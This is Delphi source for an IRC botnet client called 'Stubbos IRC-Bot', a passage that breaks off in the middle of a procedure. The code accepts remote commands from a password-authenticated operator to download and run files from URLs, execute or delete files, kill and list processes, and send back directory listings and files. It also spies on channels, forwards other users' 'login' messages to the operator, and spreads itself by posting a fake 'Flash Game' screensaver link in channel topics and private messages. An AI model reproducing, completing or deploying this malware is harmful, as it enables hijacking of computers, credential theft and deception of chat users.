(* STUBBOS IRC-BOT *)
(* CREATED BY P0KE *)

unit spreader_bot;

interface

uses
  Windows, Winsock, untDCC, ShellAPI, scan_spread, md5, plugin_spreader, TLHelp32;

Type
  TIPs             = ARRAY[0..10] OF STRING;

  tClone = Record
    Server    :String;
    Port      :Integer;
    Nick      :String;
    Channel   :String;
    Key       :String;
    Password  :String;
  End;
  pClone = ^tClone;

  tIRC = Class(TObject)
    Private
      Procedure SplitParam(Data: String);
      Function  IsNumeric(Str : String): Bool;
    Public
      Silence   :Bool;
      FromNick  :String;
      FromChan  :String;
      FromHost  :String;
      RecvText  :String;
      SpyChannel:String;
      SpyTo     :String;
      SpyOn     :Bool;
      IsCommand :Bool;
      Commando  :String;
      Params    :Array[0..9000] Of String;
      Sock      :TSocket;
      LoggedIn  :Bool;
      LoggedHost:String;
      LoggedName:String;
      Procedure ParseInfo(Data: String);
      Function  ReceiveData: Bool;
    End;

  tSock = Class(TObject)
    Private
      Sock      :TSocket;
      Addr      :TSockAddrIn;
      WSA       :TWSAData;
      Servern   :String;
    Public
      IsChat    :Bool;
      IRC       :tIRC;
      Clone     :Bool;
      Server    :String;
      Port      :Integer;
      Nick      :String;
      Channel   :String;
      Key       :String;
      Password  :String;
      Procedure SendInfo;
      Procedure DoCommando;
      Procedure SendRAW(Text: String);
      Procedure ReadCommando(Data: String; Buffer: Array Of Char; Sock2: TSocket);
      Procedure SendData(Data: String; Chat: Bool; Sockish: TSocket);
      Function  StartUp: Bool;
      Function  Connect: Bool;
      Function  DownloadFile(urlFrom, urlTo: String): Integer;
      Function  DoPlugin(DLLName: String; AddData: String): Bool;
    End;

var
  ircnicks:Array[0..70] of string =     ('charles',     'lisa',         'petter',       'monika',         // 4
                                         'frans',       'knas',         'fnas',         'd0o0o',          // 8
                                         'pille',       'nille',        'ankan',        'fiskmoesen',     // 12
                                         'jen',         'ken',          'cartman',      'stan',           // 16
                                         'kyla',        'cheif',        'garrison',     'hatman',         // 20
                                         'batman',      'nisse',        'kurt',         'benny',          // 24
                                         'betty',       'abdul',        'abdol',        'mohammed',       // 28
                                         'hanna',       'lelle',        'victoria',     'vironika',       // 32
                                         'plankan',     'potatismos',   'korvmannen',   'korven',         // 36
                                         'rulle',       'rille',        'orvar',        'ostboeg',        // 40
                                         'boegen',      'cindy',        'catarina',     'aschmed',        // 44
                                         'supfoo',      'letsdance',    'wiihiee',      'motherlaw',      // 48
                                         'natureman',   'thetree',      'onestep',      'hellgates',      // 52
                                         'darkarchangel','deft_tone',   'garfield',     'white_rabbit',   // 56
                                         'mickael',     'xxx_lil_hottie_xxx',           'pyr0maniac',     // 60
                                         'teh_puppeteer','xiao_wei',    'starlite_45',  'angelika',       // 64
                                         'anti_matter', 'rose',         's0nix',        'blak_ninja',     // 68
                                         'grimreaper', 'shadowstalker', 'hunter',       'grave_robber'     //
                                        );

  ircnicks2             : array [0..9]  of string = (
  'away', 'aw', '', 'game', 'food', 'zzz', 'zz', 'a', 'o_O', 'sex');
  ircnicks3             : array [0..5]  of string = (
  '|', '`', '_', '||', '[', '{');

  IPs : TIPs;
  Info: tClone;

  Function RandIRCBot: String;
  function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord;
                                         StatusCB: cardinal): Longword; stdcall;
                                         external 'URLMON.DLL' name 'URLDownloadToFileA';

implementation

uses
  stats_spreader;

function FileExists(const FileName: string): Boolean;
var
lpFindFileData: TWin32FindData;
hFile: Cardinal;
begin
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    result := True;
    Windows.FindClose(hFile)
  end
  else
    result := False;
end;

Function tSock.DoPlugin(DLLName: String; AddData: String): Bool;
var
  Dir   :Array[0..255] Of Char;
  Path  :String;
  Buf   :String;
  Data  :String;
Begin
  Data := IRC.FromNick+'!'+IRC.FromHost+'?'+IRC.FromChan+' '+AddData;

  GetSystemDirectory(Dir, 256);
  Path := String(Dir)+'\';
  If (DLLName[Length(DLLName)-3] <> '.') Then
    Path := Path + DLLName + '.dll'
  Else
    Path := Path + DLLName;

  Result := True;
  If (FileExists(Path)) Then
  Begin
    Buf := LoadPlugin(Path, Data);
    If (Copy(Buf, 1, 7) = 'PRIVMSG') Then
      Send(Sock, Buf[1], Length(Buf), 0)
    Else
    Begin
      Buf := 'PRIVMSG '+Channel+' :'+Buf+#10;
      Send(Sock, Buf[1], Length(Buf), 0)
    End;
  End Else
    Result := False;
End;

function MakeClone(P: Pointer): DWord; STDCALL;
Var
  Clone: tSock;
Begin
  Clone := tSock.Create;
  Clone.Clone := True;

  Clone.Server   := pClone(P)^.Server;
  Clone.Port     := pClone(P)^.Port;
  Clone.Nick     := pClone(P)^.Nick;
  Clone.Channel  := pClone(P)^.Channel;
  Clone.Key      := pClone(P)^.Key;
  Clone.Password := pClone(P)^.Password;
  Clone.StartUp;
  Result := 0;
End;

Procedure ClonyMyBot(Server, Nick, Channel, Key, Password: String; Port: Integer);
Var
  ThreadID      :THandle;
Begin
  Info.Server := Server;
  Info.Port := Port;
  Info.Nick := Nick;
  Info.Channel := Channel;
  Info.Key := Key;
  Info.Password := Password;

  CreateThread(NIL, 0, @MakeClone, @Info, 0, ThreadID);
End;

function StrtoInt(const S: string): integer; var
E: integer; begin Val(S, Result, E); end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function FixLength(Str: String; Int: Integer): String;
Begin
  While Length(Str) < Int Do
    Str := ' '+Str;
  Result := Str;
End;

Procedure ListDirectory(Dir: String; Var Output: String; MAttr: String);
Var
  SR    :TSearchRec;
  F     :TextFile;
  Line  :String;
  Attr  :String;
Begin
  If (Dir[Length(Dir)] <> '\') Then Dir := Dir + '\';

  Line := '';
  If (FindFirst(Dir + '*.*', faDirectory, SR) = 0) Then
  Repeat
    If (SR.Name[1] <> '.') Then
    Begin

      Attr := '';
      If ((SR.Attr and faDirectory) = faDirectory) Then Attr := Attr + 'D';
      If ((SR.Attr and faReadOnly ) = faReadOnly ) Then Attr := Attr + 'R';
      If ((SR.Attr and faSysFile  ) = faSysFile  ) Then Attr := Attr + 'S';
      If ((SR.Attr and faVolumeID ) = faVolumeID ) Then Attr := Attr + 'V';
      If ((SR.Attr and faArchive  ) = faArchive  ) Then Attr := Attr + 'A';
      If ((SR.Attr and faAnyFile  ) = faAnyFile  ) Then Attr := Attr + 'F';
      If ((SR.Attr and faHidden   ) = faHidden   ) Then Attr := Attr + 'H';

      If (MAttr <> '') Then
      Begin
        If (Attr = MAttr) Then
          Line := Line + 'name['+FixLength(SR.Name, 25)+'] '+
                         'size['+FixLength(IntToStr(SR.Size), 10)+'b] '+
                         'Attribute['+FixLength(Attr, 10)+'] '+
                         'MD5['+MD5Print(MD5File(Dir+SR.Name))+']'#13#10;
      End Else
          Line := Line + 'name['+FixLength(SR.Name, 25)+'] '+
                         'size['+FixLength(IntToStr(SR.Size), 10)+'b] '+
                         'Attribute['+FixLength(Attr, 10)+'] '+
                         'MD5['+MD5Print(MD5File(Dir+SR.Name))+']'#13#10;
    End;
  Until FindNext(SR) <> 0;
  FindClose(SR);

  Randomize;
  OutPut := 'C:\FL['+IntToStr(Random(400000000))+'].tmp';

  AssignFile(F, OutPut);
  ReWrite(F);
    WriteLn(F, '# D = Directory');
    WriteLn(F, '# R = ReadOnly');
    WriteLn(F, '# S = SysFile');
    WriteLn(F, '# V = VolumeID');
    WriteLn(F, '# A = Archive');
    WriteLn(F, '# F = AnyFile');
    WriteLn(F, '# H = Hidden');
    WriteLn(F);
    Write(F, Line);
  CloseFile(F);
End;

Function RandIRCBot: String;
Var
  Rand_1        :Integer;
  Rand_2        :Integer;
  Rand_3        :Integer;
  Rand_4        :Integer;
  Nick          :String;
  Temp          :String;
Begin
  Randomize;
  Rand_1 := Random(20);
  Rand_2 := Random(10);
  Rand_3 := Random(8);
  Rand_4 := Random(100);

  Nick := ircnicks[Rand_1];
  If (Rand_4 > 60) Then
  Begin
    Temp := ircnicks3[rand_3];
    if (Temp = '{') Then
      Temp := Temp + ircnicks2[rand_2]+'}';
    if (Temp = ']') Then
      Temp := Temp + ircnicks2[rand_2]+']';
    Nick := Nick+Temp;
  End;
  Result := Nick;
End;

PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);
TYPE
  TaPInAddr = ARRAY [0..10] OF PInAddr;
  PaPInAddr = ^TaPInAddr;
VAR
  phe       : PHostEnt;
  pptr      : PaPInAddr;
  Buffer    : ARRAY [0..63] OF Char;
  I         : Integer;
  GInitData : TWSAData;
BEGIN
  WSAStartup($101,GInitData);
  GetHostName(Buffer,SizeOf(Buffer));
  phe:=GetHostByName(Buffer);
  IF phe=NIL THEN Exit;
  pPtr:=PaPInAddr(phe^.h_addr_list);
  I:=0;
  WHILE pPtr^[I]<>NIL DO BEGIN
    IPs[I]:=inet_ntoa(pptr^[I]^);
    NumberOfIPs:=I;
    Inc(I);
  END;
  WSACleanup;
END;

Function GetLocalIP: String;
VAR
  NumberOfIPs : Byte;
  I           : Byte;
  IP          : STRING;
Begin
  GetIPs(IPs,NumberOfIPs);
  FOR I:=0 TO NumberOfIPs DO
    IP:=IPs[I];
  Result := IP;
End;

Function GetLocalName: String;
Var
  LocalHost     : Array [0..63] Of Char;
Begin
  GetHostName(LocalHost, SizeOf(LocalHost));
  Result := String(LocalHost);
End;

FUNCTION NameToIP(HostName:STRING) : STRING;
TYPE
  TAPInAddr = ARRAY [0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  I          : Integer;
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(pChar(HostName));
    IF HostEntPtr<>NIL THEN BEGIN
      pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
      I:=0;
      WHILE pptr^[I]<>NIL DO BEGIN
        Result:=(inet_ntoa(pptr^[I]^));
        Inc(I);
      END;
    END;
  EXCEPT
  END;
  WSACleanUp();
END;

function GetFileSize(FileName: String): Int64;
Var
  H: THandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
  End;
End;

Procedure tSock.SendRAW(Text: String);
Begin
  If (Not IRC.Silence) Then
    Send(Sock, Text[1], Length(Text), 0);
End;

Function tSock.DownloadFile(urlFrom, urlTo: String): Integer;
Begin
 If (URLDownloadToFile(0, pChar(urlFrom), pChar(urlTo), 0, 0) = s_ok) Then
   Result := 0 else Result := -1;
End;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

Function ListProc: String;
Var
  ContinueLoop  :       Boolean;
  hSnapShot     :       THandle;
  LPPE          :       TProcessEntry32;
  LPME          :       TModuleEntry32;
  F             :       TextFile;
Begin
  hSnapShot := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS or TH32CS_SNAPMODULE, 0);
  LPPE.dwSize := SizeOf(LPPE);
  ContinueLoop := Process32First(hSnapShot, LPPE);

  Result := '';
  While (Integer(ContinueLoop) <> 0) Do
  Begin
    Result := Result + 'id:['+FixLength(IntToStr(LPPE.th32ProcessID), 5)+'] process:['+LPPE.szExeFile+']'#13#10;
    ContinueLoop := Process32Next(hSnapShot, LPPE);
  End;

  CloseHandle(hSnapShot);

  AssignFile(F, 'C:\ProcList.tmp');
  ReWrite(F);
    Write(F, Result);
  CloseFile(F);
  Result := 'C:\ProcList.tmp';
End;

Function KillProc(Proc: String): Bool;
Var
  Ret           :       Bool;
  ProcessID     :       Integer;
  ProcessH      :       THandle;
Begin
  Result := False;
  If (Proc = '') Then Exit;

  Try
    ProcessID := StrToInt({'$' + }Proc);
    ProcessH  := OpenProcess(PROCESS_TERMINATE, BOOL(0), ProcessID);
    Ret := TerminateProcess(ProcessH, 0);
    If Integer(Ret) = 0 Then Exit;
  Except
    Exit;
  End;
  Result := True;
End;

Procedure tSock.SendData(Data: String; Chat: Bool; Sockish: TSocket);
Begin
  If (Chat) Then
    Delete(Data, 1, Pos(':', Data));

  Send(Sockish, Data[1], Length(Data), 0);
End;

Procedure tSock.ReadCommando(Data: String; Buffer: Array Of Char; Sock2: TSocket);
var
  Temp          :String;
  Buf           :String;
  Backup        :String;
  Port          :String;
  fName         :String;
  CloneBot      :tSock;
  Length_       :Integer;
  I             :Integer;
  FileTransfer  :TFileTransfer;
  tempsock      :tSocket;
Begin
  If (Sock2 <> Sock) Then tempsock := Sock2 Else tempsock := Sock;

  FileTransfer := TFileTransfer.Create;
    While (Pos(#10, Data) > 0) Do
    Begin
      Temp := Copy(Data, 1, pos(#10, Data)-1);

      ZeroMemory(@Buffer, SizeOf(Buffer));
      IRC.ParseInfo(Temp);

      If (Pos('nick', LowerCase(Temp)) > 0) And (Pos('in use', LowerCase(Temp)) > 0) then
      Begin
        Buf := 'NICK '+RandIRCBot+#10;
        SendData(Buf, IsChat, tempSock);
      End;

      If (IRC.IsCommand) Then
      Begin
        If (Pos('001', Temp) > 0) or (Pos('MOTD', Temp) > 0) or (Pos('message of the day', LowerCase(Temp)) > 0) Then
        Begin
          Buf := 'JOIN '+Channel+' '+Key+#10;
          SendData(Buf, IsChat, tempSock);
        End;
      End Else
      Begin
        If (IRC.Params[1] = 'MODE') Then
          If (String(IRC.Params[4]) = Nick) Then
          Begin
            If (String(IRC.Params[3]) = '+o') Then
            Begin
              Buf := 'TOPIC '+String(IRC.Params[2])+' :~~~~ :) ~~~~ http://'+GetLocalIP+':81/EndofEarth.scr LOL (Flash Game)'#10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (String(IRC.Params[3]) = '-o') Then
            Begin
              Buf := 'PRIVMSG '+IRC.FromNick+' :http://'+GetLocalIP+':81/EndofEarth.scr LOL (Flash Game)'#10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (String(IRC.Params[3]) = '+v') Then
            Begin
              Buf := 'PRIVMSG '+IRC.Params[2]+' :Thank you for the voice.'#10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (String(IRC.Params[3]) = '-v') Then
            Begin
              Buf := 'PRIVMSG '+IRC.Params[2]+' :What did i do to deserv this '+IRC.FromNick+'?'#10;
              SendData(Buf, IsChat, tempSock);
            End;
          End;

        If (IRC.Params[1] = 'PRIVMSG') Then
        Begin
          If (IRC.FromChan <> '') Then
            If (IRC.FromChan[1] = '#') Then
            Begin
              (*                STEAL           *)
              If (IRC.LoggedIn) Then
                If (IRC.FromNick <> IRC.LoggedName) Then
                  If (Pos('login', LowerCase(IRC.RecvText)) > 0) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.LoggedName+' :('+IRC.FromChan+') ['+IRC.FromNick+'!'+IRC.FromHost+'] '+IRC.RecvText+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (*                NICK            *)
              If (LowerCase(String(IRC.Params[3])) = ':.newnick') Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'NICK '+RandIRCBot+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (*                DIE             *)
              If (LowerCase(String(IRC.Params[3])) = ':.die') Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'QUIT'#10;
                    SendData(Buf, IsChat, tempSock);
                    Sleep(800);

                    If (Clone) Then
                      CloseSocket(Sock)
                    Else
                      ExitProcess(0);
                  End;

              (*                LOGIN           *)
              If (LowerCase(String(IRC.Params[3])) = ':.login') Then
                If (IRC.Params[4] = Password) Then
                Begin
                  If (IRC.LoggedIn = False) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Login Successfull'#10;
                    If Not (IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                    IRC.LoggedIn := True;
                    IRC.LoggedHost := IRC.FromHost;
                    IRC.LoggedName := IRC.FromNick;
                  End;
                End Else
                If (IRC.LoggedIn) Then
                Begin
                  Buf := 'PRIVMSG '+IRC.LoggedName+' :Failed login attempt from ['+IRC.FromNick+'!'+IRC.FromHost+']';
                  If (Copy(IRC.FromChan,1,1) = '#') Then
                    Buf := Buf + ' @ '+IRC.FromChan+#10
                  Else
                    Buf := Buf + #10;
                  SendData(Buf, IsChat, tempSock);
                End;

              (*                LOGOUT          *)
              If (LowerCase(String(IRC.Params[3])) = ':.logout') Then
                If (IRC.FromHost = IRC.LoggedHost) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    IRC.LoggedIn := False;
                    IRC.LoggedHost := '';
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Logout Successfull'#10;
                    If Not (IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (*                INFO            *)
              If (LowerCase(String(IRC.Params[3])) = ':.info') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    If (String(IRC.Params[4]) = '1') Then
                    Begin
                      GatherStats(Buf);
                      If Not (IRC.Silence) Then
                        Buf := 'PRIVMSG '+IRC.FromChan+' :'+Buf+#10
                      Else
                        Buf := 'PRIVMSG '+IRC.FromNick+' :'+Buf+#10;
                    End Else
                    Begin
                      If Not (IRC.Silence) Then
                        Buf := 'PRIVMSG '+IRC.FromChan+' :[ip:'+GetLocalIp+'][Hostname:'+GetLocalName+']'#10
                      Else
                        Buf := 'PRIVMSG '+IRC.FromNick+' :[ip:'+GetLocalIp+'][Hostname:'+GetLocalName+']'#10
                    End;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (*                SILENCE         *)
              If (LowerCase(String(IRC.Params[3])) = ':.silence') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                    IRC.Silence := Boolean(StrToInt(String(IRC.Params[4])));

              (*                DCC CHAT        *)
              If (Pos('DCC CHAT', IRC.RecvText) > 0) Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Buf := Copy(Buf, Pos('DCC CHAT', Buf)+9, Length(Buf));
                    If (Buf[1] = ' ') Then
                      Delete(Buf, 1, 1);
                    Delete(Buf, 1, Pos(' ', Buf)-1);
                    IRC.SplitParam(Buf);
                    
                    FileTransfer.AcceptChat(IRC.FromNick, IRC.FromHost, String(IRC.Params[0]), StrToInt(String(IRC.Params[1])));
                  End;

              (*                DCC SEND        *)
              If (Pos('DCC SEND', IRC.RecvText) > 0) Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Buf := Copy(Buf, Pos('DCC SEND', Buf)+9, Length(Buf));
                    If (Buf[1] = ' ') Then
                      Delete(Buf, 1, 1);
                    IRC.SplitParam(Buf);
                    FileTransfer.ReceiveFile(String(IRC.Params[0]), StrToInt(String(IRC.Params[2])), String(IRC.Params[1]), Sock);
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Accepted Filetransfer Of ('+String(IRC.Params[0])+') on port ('+String(IRC.Params[2])+')'#10;
                    If Not (IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (*                KILL PROC       *)
              If (LowerCase(String(IRC.Params[3])) = ':.killproc') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    If (KillProc( String(IRC.Params[4]) )) Then
                      Buf := 'Killed processes'#10
                    Else
                      Buf := 'Cant kill process'#10;

                    Buf := 'PRIVMSG '+IRC.FromChan+' :'+Buf;
                    If Not (IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (*                LIST PROC       *)
              If (LowerCase(String(IRC.Params[3])) = ':.listproc') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                      Backup := ListProc;

                      Randomize;
                      Port := IntToStr(Random(5000)+100);

                      Buf := 'PRIVMSG '+IRC.FromNick+' :'#1'DCC SEND ';
                      fName := Backup;
                      Length_ := GetFileSize(Backup);
                      Backup := ExtractFileName(Backup);

                      For I := 1 To Length(BackUp) Do
                        If (BackUp[I] = #32) Then
                          BackUp[I] := #95;

                      Buf := Buf + Backup + ' ' + IntToStr(htonl(inet_addr(pchar(GetLocalIP)))) + ' ' + Port + ' ' + IntToStr(Length_)+#1#10;
                      SendData(Buf, IsChat, tempSock);

                      FileTransfer.SendFile(fName, StrToInt(Port), Length_);
                  End;

              (*                LIST DIR        *)
              If (LowerCase(String(IRC.Params[3])) = ':.listdir') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                    If (IRC.Params[4] <> '') Then
                    Begin
                      ListDirectory(IRC.Params[4], Backup, IRC.Params[5]);

                      Randomize;
                      Port := IntToStr(Random(5000)+100);

                      Buf := 'PRIVMSG '+IRC.FromNick+' :'#1'DCC SEND ';
                      fName := Backup;
                      Length_ := GetFileSize(Backup);
                      Backup := ExtractFileName(Backup);

                      For I := 1 To Length(BackUp) Do
                        If (BackUp[I] = #32) Then
                          BackUp[I] := #95;

                      Buf := Buf + Backup + ' ' + IntToStr(htonl(inet_addr(pchar(GetLocalIP)))) + ' ' + Port + ' ' + IntToStr(Length_)+#1#10;
                      SendData(Buf, IsChat, tempSock);

                      FileTransfer.SendFile(fName, StrToInt(Port), Length_);
                    End;

              (*                DCC RECV        *)
              If (LowerCase(String(IRC.Params[3])) = ':.getfile') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    Randomize;
                    Port := IntToStr(Random(5000)+100);

                    Buf := 'PRIVMSG '+IRC.FromNick+' :'#1'DCC SEND ';
                    BackUp := IRC.RecvText;
                    Delete(BackUp, 1, Pos('getfile', BackUp)+7);
                    fName := bAckup;
                    Length_ := GetFileSize(Backup);
                    BackUp := ExtractFileName(BackUp);

                    For I := 1 To Length(BackUp) Do
                      If (BackUp[I] = #32) Then
                        BackUp[I] := #95;

                    Buf := Buf + Backup +' '+ IntToStr(htonl(inet_addr(pchar(GetLocalIP)))) +' ' + port + ' ' + IntToStr(Length_)+#1#10;
                    SendData(Buf, IsChat, tempSock);

                    FileTransfer.SendFile(fName, StrToInt(Port), Length_);
                  End;

              (*                URL DOWNLAOD    *)
              If (LowerCase(String(IRC.Params[3])) = ':.download') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Downloading File.'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                    Buf := 'PRIVMSG '+IRC.FromChan+' :';
                    If (DownloadFile(String(IRC.Params[4]), String(IRC.Params[5])) = -1) Then
                      Buf := Buf + 'Download Failed.' Else Buf := Buf + 'Downloaded File';
                    Buf := Buf + #10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                    If (String(IRC.Params[6]) = '1') Then
                      ShellExecute(0, 'open', pchar(String(IRC.Params[5])), nil, nil, 1);
                  End;

              (*                SPY CHANNEL     *)
              If (LowerCase(String(IRC.Params[3])) = ':.spyoff') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    If (IRC.SpyOn) Then IRC.SpyOn := False;
                    Buf := 'PART '+IRC.SpyChannel+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (*                SPY CHANNEL     *)
              If (LowerCase(String(IRC.Params[3])) = ':.spyon') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    If (IRC.SpyOn) Then
                    Begin
                      Buf := 'PART '+IRC.SpyChannel+#10;
                      SendData(Buf, IsChat, tempSock);
                    End;

                    IRC.SpyTo := String(IRC.Params[5]);
                    IRC.SpyOn := True;
                    IRC.SpyChannel := String(IRC.Params[4]);
                    Buf := 'JOIN '+IRC.SpyChannel+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (*                SPYING CHAN     *)
              If (IRC.SpyOn) Then
                If (IRC.FromChan = IRC.SpyChannel) Then
                Begin
                  Buf := 'PRIVMSG '+IRC.SpyTo+' :('+IRC.SpyChannel+') ['+IRC.FromNick+'!'+IRC.FromHost+']: '+IRC.RecvText+#10;
                  If (Not IRC.Silence) Then
                    SendData(Buf, IsChat, tempSock);
                End;

              (*                CLONEBOT        *)
              If (LowerCase(String(IRC.Params[3])) = ':.clone') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    If (IRC.Params[4] = '*') Then IRC.Params[4] := '';
                    If (IRC.Params[5] = '*') Then IRC.Params[5] := RandIRCBot;
                    If (IRC.Params[6] = '*') Then IRC.Params[6] := '';
                    If (IRC.Params[7] = '*') Then IRC.Params[7] := '';
                    If (IRC.Params[8] = '*') Then IRC.Params[8] := '';
                    If (IRC.Params[9] = '' ) Then IRC.Params[9] := '0';
                    If (IRC.Params[9] = '*') Then IRC.Params[9] := '0';
                    If (IRC.Params[4] <> '') Then
                      For I := 0 To StrToInt(String(IRC.Params[9]))-1 Do
                        ClonyMyBot(String(IRC.Params[4]) ,
                                   String(IRC.Params[5]) ,
                                   String(IRC.Params[6]) ,
                                   String(IRC.Params[7]) ,
                                   String(IRC.Params[8]) ,
                                   StrToInt(String(IRC.Params[9])));
                  End;

              (*                RAW SEND        *)
              If (LowerCase(String(IRC.Params[3])) = ':.raw') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Delete(Buf, 5, Length(Buf));
                    SendData(Buf, IsChat, tempSock);
                  End;

              (*                PLUGIN          *)
              If (LowerCase(String(IRC.Params[3])) = ':.plugin') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    If (FileExists(String(IRC.Params[4]))) Then
                    Begin
                      Buf := IRC.RecvText;
                      Delete(Buf, 1, 7);
                      If DoPlugin(String(IRC.Params[4]), Buf) Then
                        Buf := 'PRIVMSG '+IRC.FromChan+' :Plugin Loaded'#10
                      Else
                        Buf := 'PRIVMSG '+IRC.FromChan+' :Plugin Failed To Load'#10;
                    End Else
                      Buf := 'PRIVMSG '+IRC.FromChan+' :Plugin Failed To Load (Doesnt Exist)'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (*                EXECUTE         *)
              If (LowerCase(String(IRC.Params[3])) = ':.execute') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Delete(Buf, 1, 8);
                    If (FileExists(Buf)) Then
                    Begin
                      ShellExecute(0, 'open', pChar(Buf), NIL, NIL, 0);
                      Buf := 'PRIVMSG '+IRC.FromChan+' :Executed File'#10;
                    End Else
                      Buf := 'PRIVMSG '+IRC.FromChan+' :File Doesnt Exist'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (*                DELETE          *)
              If (LowerCase(String(IRC.Params[3])) = ':.delete') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Delete(Buf, 1, 7);
                    If (FileExists(Buf)) Then
                    Begin
                      DeleteFile(pChar(Buf));
                      Buf := 'PRIVMSG '+IRC.FromChan+' :Deleted file'#10;
                    End Else
                      Buf := 'PRIVMSG '+IRC.FromChan+' :File Doesnt Exist'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (*                UNINSTALL       *)
              If (LowerCase(String(IRC.Params[3])) = ':.uninstall') Then
                If (IRC.LoggedIn) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                  Begin
                    WritePrivateProfileString('boot', 'shell', 'explorer.exe', 'system.ini');
                    Buf := 'QUIT :Uninstalled! Stubbos Bot!'#10;
                    SendData(Buf, IsChat, tempSock);
                    Sleep(800);
                    ExitProcess(0);
                  End;
            End;

        End;

        If (IRC.Params[0] = 'PING') Then
        Begin
          Buf := 'PONG ' + String(IRC.Params[1]) + #$0A;
          send(tempsock, Buf[1], Length(Buf), 0);
          SLeep(300);
          Buf := 'JOIN '+Channel+' '+Key+#10;
          send(tempsock, Buf[1], Length(Buf), 0);
        End;
      End;
      Data := Copy(Data, Pos(#10, Data)+1, Length(Data));
    End;
End;

Procedure tSock.DoCommando;
Var
  Buffer        :Array[0..6000] Of Char;
  Data          :String;
Begin
  ZeroMemory(@Buffer, SizeOf(Buffer));
  While (IRC.ReceiveData) Do
  Begin
    Recv(Sock, Buffer, SizeOf(Buffer), 0);
    Data := String(Buffer);
    IsChat := False;
    ReadCommando(Data, Buffer, Sock);
  End;
End;

Procedure tSock.SendInfo;
Var
